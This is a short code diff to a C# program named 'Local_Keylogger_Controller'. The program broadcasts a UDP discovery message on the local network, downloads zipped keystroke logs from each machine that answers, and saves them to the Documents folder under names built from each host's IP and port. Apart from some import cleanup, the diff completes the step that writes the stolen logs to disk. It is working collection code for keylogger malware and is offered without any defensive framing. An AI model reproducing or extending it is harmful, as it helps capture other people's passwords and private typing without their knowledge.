@@ -1,7 +1,12 @@
-﻿using System.Net;
-using System.Net.Sockets;
-using System.Collections;
+﻿using System;
 using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Http;
+using System.IO;
+
 
 namespace Local_Keylogger_Controller
 {
@@ -18,7 +23,7 @@ namespace Local_Keylogger_Controller
             using UdpClient udpClient = new UdpClient();
             udpClient.EnableBroadcast = true;
 
-            byte[] payload = System.Text.Encoding.UTF8.GetBytes(DiscoveryMessage);
+            byte[] payload = Encoding.UTF8.GetBytes(DiscoveryMessage);
             IPEndPoint endPoint = new IPEndPoint(IPAddress.Broadcast, DiscoveryPort);
 
             await udpClient.SendAsync(payload, payload.Length, endPoint);
@@ -115,8 +120,11 @@ namespace Local_Keylogger_Controller
                         {
                             byte[] zipBytes = await client.GetByteArrayAsync(url);
 
-                            string outPatch = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-                            string patchCombine = Path.Combine(outPatch, $"keylog_{ip}_{port}.zip");
+                            string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                            string filePatch = Path.Combine(documents, $"keylog_{ip.Replace(".","_")}_{port}.zip");
+
+                            File.WriteAllBytes(filePatch, zipBytes);
+                            Console.WriteLine($"OK: Key logs saved to {filePatch}");
                         }
                         catch (Exception ex)
                         {
